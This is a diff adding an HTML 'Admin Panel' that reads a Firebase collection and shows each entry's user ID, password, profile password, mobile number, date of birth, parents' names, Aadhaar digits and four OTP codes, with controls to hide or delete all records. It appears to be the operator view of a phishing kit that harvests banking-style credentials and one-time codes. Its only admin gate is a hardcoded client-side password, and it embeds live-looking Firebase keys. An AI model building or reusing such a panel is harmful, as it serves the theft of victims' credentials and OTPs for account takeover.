@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Admin Panel - User Data</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    .active-btn {
+      background-color: green !important;
+      color: white !important;
+    }
+  </style>
+</head>
+<body class="bg-light">
+  <div class="container my-5">
+    <h2 class="text-center mb-4">Admin Panel - User Data</h2>
+
+    <div class="text-center mb-3">
+      <button id="adminAccess" class="btn btn-dark">🔐 Admin Access</button>
+    </div>
+
+    <div id="adminControls" class="text-center mb-3" style="display: none;">
+      <button class="btn btn-outline-success me-2" id="showBtn">👁️ Show Data</button>
+      <button class="btn btn-outline-warning me-2" id="hideBtn">🙈 Hide Data</button>
+      <button class="btn btn-outline-danger" id="deleteAllBtn">🗑️ Delete All</button>
+    </div>
+
+    <p id="visibilityStatus" class="text-center"></p>
+
+    <div id="userDataContainer"></div>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
+    import {
+      getFirestore,
+      collection,
+      onSnapshot,
+      orderBy,
+      query,
+      deleteDoc,
+      getDocs,
+      getDoc,
+      updateDoc,
+      doc,
+      setDoc
+    } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyAQChRUNOzph1tOQtVdNJnaX79VMuI1K9w",
+      authDomain: "srai-16d20.firebaseapp.com",
+      projectId: "srai-16d20",
+      storageBucket: "srai-16d20.appspot.com",
+      messagingSenderId: "13015388512",
+      appId: "1:13015388512:web:ede30255ac370257f7ce05"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+    const visibilityDocRef = doc(db, "settings", "visibility");
+
+    const adminBtn = document.getElementById("adminAccess");
+    const showBtn = document.getElementById("showBtn");
+    const hideBtn = document.getElementById("hideBtn");
+    const deleteBtn = document.getElementById("deleteAllBtn");
+    const adminControls = document.getElementById("adminControls");
+    const container = document.getElementById("userDataContainer");
+    const visibilityStatus = document.getElementById("visibilityStatus");
+
+    let isAdmin = false;
+
+    async function ensureVisibilityDoc() {
+      const visSnap = await getDoc(visibilityDocRef);
+      if (!visSnap.exists()) {
+        await setDoc(visibilityDocRef, { show: true });
+      }
+    }
+
+    async function renderData() {
+      await ensureVisibilityDoc();
+      const visSnap = await getDoc(visibilityDocRef);
+      const showData = visSnap.data().show;
+
+      visibilityStatus.innerHTML = showData
+        ? `<span class="text-success fw-bold">🟢 Data is Public</span>`
+        : `<span class="text-danger fw-bold">🔴 Data is Hidden</span>`;
+
+      if (!showData && !isAdmin) {
+        container.innerHTML = `<div class='alert alert-warning text-center'>🙅 Data hidden by admin.</div>`;
+        return;
+      }
+
+      const q = query(collection(db, "users"), orderBy("timestamp", "desc"));
+      onSnapshot(q, (snapshot) => {
+        if (snapshot.empty) {
+          container.innerHTML = `<p class="text-danger text-center">No Data Found</p>`;
+          return;
+        }
+
+        let html = `
+          <table class="table table-bordered table-sm">
+            <thead><tr>
+              <th>User ID</th><th>Password</th><th>Mobile</th>
+              <th>Profile Password</th><th>DOB</th><th>Father</th>
+              <th>Mother</th><th>Full Name</th><th>Aadhaar</th>
+              <th>OTP A</th><th>OTP B</th><th>OTP C</th><th>OTP D</th>
+              <th>Timestamp</th>
+            </tr></thead><tbody>
+        `;
+
+        snapshot.forEach(doc => {
+          const d = doc.data();
+          html += `<tr>
+            <td>${d.userId || ''}</td><td>${d.password || ''}</td><td>${d.mobile || ''}</td>
+            <td>${d.profilePassword || ''}</td><td>${d.dateOfBirth || ''}</td><td>${d.fatherName || ''}</td>
+            <td>${d.motherName || ''}</td><td>${d.fullName || ''}</td><td>${d.aadhaarLastDigits || ''}</td>
+            <td>${d.otp_a || ''}</td><td>${d.otp_b || ''}</td><td>${d.otp_c || ''}</td><td>${d.otp_d || ''}</td>
+            <td>${d.timestamp?.toDate().toLocaleString() || ''}</td>
+          </tr>`;
+        });
+
+        html += `</tbody></table>`;
+        container.innerHTML = html;
+      });
+    }
+
+    adminBtn.onclick = async () => {
+      const pwd = prompt("Enter Admin Password:");
+      if (pwd === "delete@123") {
+        isAdmin = true;
+        adminControls.style.display = "block";
+        renderData();
+      } else {
+        alert("❌ Wrong Password");
+      }
+    };
+
+    showBtn.onclick = async () => {
+      await updateDoc(visibilityDocRef, { show: true });
+      toggleActive(showBtn);
+      alert("✔️ Data is now visible");
+      renderData();
+    };
+
+    hideBtn.onclick = async () => {
+      await updateDoc(visibilityDocRef, { show: false });
+      toggleActive(hideBtn);
+      alert("🙈 Data is now hidden");
+      renderData();
+    };
+
+    deleteBtn.onclick = async () => {
+      const confirmDelete = confirm("⚠️ Are you sure you want to delete ALL data?");
+      if (!confirmDelete) return;
+
+      const snapshot = await getDocs(collection(db, "users"));
+      const deletePromises = snapshot.docs.map(doc => deleteDoc(doc.ref));
+      await Promise.all(deletePromises);
+
+      alert("🗑️ All data deleted.");
+      container.innerHTML = "";
+    };
+
+    function toggleActive(activeBtn) {
+      [showBtn, hideBtn].forEach(btn => btn.classList.remove("active-btn"));
+      activeBtn.classList.add("active-btn");
+    }
+
+    renderData();
+  </script>
+</body>
+</html>
